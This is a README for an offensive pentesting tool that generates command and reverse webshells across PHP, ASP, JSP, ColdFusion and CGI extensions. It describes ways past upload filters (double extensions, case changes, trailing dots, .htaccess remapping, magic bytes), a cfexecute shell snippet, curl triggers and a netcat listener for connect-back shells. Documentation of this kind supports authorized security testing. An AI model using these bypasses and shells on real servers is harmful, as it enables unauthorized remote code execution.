# webshell-forge

Stack-aware webshell forge for authorized web-app pentesting. Generates command
and reverse shells for a given server stack, clones them across every
execute-able file extension, and adds the double-extension / case / trailing-dot
/ magic-byte tricks that slip past upload filters — then writes an `ffuf`
wordlist so you can find *which* extension the server actually runs.

Blocked on `.php`? The handler will often still execute `.phtml`, `.phar`, or
`.php5`. On IIS it's `.aspx` / `.ashx`; on Tomcat `.jsp` / `.jspx`; on ColdFusion
`.cfm`. One command stamps your payload into all of them.

> **Authorized testing only.** Use this against systems you own or have explicit
> written permission to test (labs, CTFs, engagements with a signed scope).

---

## Why

Upload-filter bypass is a per-extension guessing game, and doing it by hand is
slow: rename, re-upload, check if it executed, repeat. This does the renaming and
bypass generation in one shot and hands you the wordlist to test execution in
bulk. It's built for OSCP-style boxes and real engagements alike.

## Features

- **Six server stacks** — `php`, `asp`, `aspx`, `jsp`, `cfm`, `cgi` (+ `all`)
- **Generates shells** — built-in `cmd` (`?c=<command>`) and `reverse` payloads,
  or bring your own with `-p`
- **tun0 auto-detect** — reverse shells auto-fill LHOST from your VPN interface
- **Bypass variants** — double extensions (both directions), case-mangling,
  trailing dot, and an `.htaccess` handler-mapping helper for PHP
- **Magic-byte prepend** — `GIF89a;` header to defeat content-sniffing filters
- **ffuf wordlist + ready command** — find which extension executes, fast
- **Interactive mode** — menu-driven, every prompt has a sane default
- **stdlib only** — no `pip`, no dependencies; runs on a bare Kali/exam box

## Requirements

Python 3.6+. Nothing else. (`ip` is used for LHOST auto-detection; if it's
missing, just pass `--lhost` manually.)

## Install

```bash
# run-from-anywhere on your PATH
mkdir -p ~/.local/bin
mv webshell-forge.py ~/.local/bin/webshell-forge
chmod +x ~/.local/bin/webshell-forge
# ensure ~/.local/bin is on PATH (zsh shown):
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc && source ~/.zshrc

webshell-forge -h
```

Or just keep it in your tools dir and call `python3 webshell-forge.py`.

## Quick start

```bash
# interactive — walks you through everything
webshell-forge

# php cmd shell across all php extensions
webshell-forge -s php

# php reverse shell (LHOST auto-detected from tun0)
webshell-forge -s php -t reverse --lport 443

# IIS shells + bypass variants + ffuf wordlist
webshell-forge -s aspx -b -w

# clone YOUR OWN payload instead of a generated one
webshell-forge -p shell.php -s php -b

# kitchen sink: every stack, bypasses, wordlist, ffuf line
webshell-forge -s all -b -w -u http://TARGET/uploads
```

Run it **from inside the box's working directory** so output lands next to that
engagement's files:

```bash
cd ~/boxes/Access
webshell-forge -s php -t reverse --lport 443 -b -w -u http://$ip/uploads
# → ./shells/ with payloads + shells.txt, right here
```

## Stacks & extensions

| Stack  | Extensions written                                       | Native reverse |
|--------|----------------------------------------------------------|:--------------:|
| `php`  | php, php3, php4, php5, php7, phtml, phar, pht, phps, shtml| yes            |
| `asp`  | asp, asa, cer, cdx                                        | via PS helper  |
| `aspx` | aspx, ashx, asmx, asax, ascx                             | via PS helper  |
| `jsp`  | jsp, jspx, jspf, jsw, jsv, war                           | yes            |
| `cfm`  | cfm, cfml, cfc                                            | via PS helper  |
| `cgi`  | cgi, pl, pm                                              | yes            |

For the Windows stacks (`asp`/`aspx`/`cfm`) there's no reliable one-liner native
reverse, so `-t reverse` falls back to a **cmd shell** and prints a **PowerShell
reverse one-liner** to run through `?c=` — rather than shipping a broken payload.

## Shell types

- `-t cmd` (default) — minimal command shell, trigger with `?c=<command>`
  (e.g. `curl 'http://TARGET/shell.phtml?c=id'`)
- `-t reverse` — connect-back shell; set `--lhost`/`--lport`
  (LHOST auto-detected from `tun0`/`tap0`, falling back to your default route)

Reverse mode also reminds you to start your listener: `nc -nlvp <port>`.

## Bypass variants (`-b`)

Generated per stack, based on that stack's real handlers:

- **Double extension, both directions** — `shell.jpg.php` (last ext wins on many
  configs) and `shell.php.jpg` (`AddHandler` / `mod_mime` misconfig runs the
  first match)
- **Case-mangling** — `shell.PHP`, `shell.Php`, `shell.phP` (case-insensitive
  blacklist vs case-sensitive handler)
- **Trailing dot** — `shell.php.` (stripped on save, missed by the blacklist)
- **`.htaccess` helper** (PHP) — maps a junk extension to the PHP handler; upload
  it alongside, then any `shell.<junk>` executes as PHP

## Magic bytes (`-m`)

Prepends `GIF89a;` so the file passes content/MIME sniffing that checks for an
image header. PHP ignores the leading bytes and still parses the tags. Other
engines may choke on the prefix — test before relying on it.

## The ffuf workflow (`-w` + `-u`)

Uploading a file isn't the same as the server *executing* it. The workflow:

```bash
# 1) generate the payloads + wordlist
webshell-forge -s php -b -w -u http://$ip/uploads

# 2) upload every file in ./shells/ (the app's form / Burp Intruder / a curl loop)

# 3) fuzz which ones landed AND rendered:
ffuf -u http://$ip/uploads/FUZZ -w shells/shells.txt -mc 200 -fs 0
#    a NON-zero size on a .phtml/.phar/.aspx = it executed = your RCE path

# 4) confirm:
curl 'http://$ip/uploads/shell.phtml?c=id'
```

## Flags

| Flag | Description |
|------|-------------|
| `-i, --interactive` | menu-driven mode (also the default when run with no args) |
| `-p, --payload FILE` | use your own payload file (overrides the generated shell) |
| `-s, --stack` | `php` `asp` `aspx` `jsp` `cfm` `cgi` `all` (default: `php`) |
| `-t, --type` | `cmd` or `reverse` (default: `cmd`) |
| `--lhost IP` | reverse callback IP (default: auto-detect `tun0`) |
| `--lport N` | reverse callback port (default: `443`) |
| `-o, --out DIR` | output directory (default: `./shells`) |
| `-n, --name STEM` | base filename stem (default: `shell`) |
| `-b, --bypass` | add double-ext / case / trailing bypasses |
| `-m, --magic` | prepend `GIF89a` magic bytes |
| `-w, --wordlist` | write `shells.txt` for ffuf |
| `-u, --url URL` | print a ready ffuf line against `URL/FUZZ` |
| `--clean` | wipe the output dir before writing |

## Extending it

Adding a stack or shell is a one-line change — that's the point of the design.

**New stack** — add an entry to `PROFILES` (extensions) and `SHELLS` (payloads):

```python
PROFILES["cfc"] = ["cfc", "cfm"]
SHELLS["cfc"] = {"cmd": '<cfexecute name="cmd.exe" arguments="/c #url.c#"></cfexecute>\n'}
```

**New reverse shell** — add a `"reverse"` key to that stack's `SHELLS` entry,
using `{LHOST}` and `{LPORT}` placeholders.

## Notes & caveats

- Generated shells are minimal **proof-of-execution stubs** — ideal for finding
  which extension runs. For a durable foothold on a real target, forge with your
  own tuned payload via `-p`.
- The php/jsp reverse templates assume a **Linux** target (`/bin/sh`,
  `/dev/tcp`). On a Windows PHP box, use `cmd` mode plus the printed PowerShell
  one-liner.
- Repeat runs write into the same `-o` dir; use `--clean` to start fresh so
  payloads from different targets don't mix.

## Disclaimer

This tool is for legal, authorized security testing and education only. You are
responsible for ensuring you have permission to test any target. The author and
contributors accept no liability for misuse.
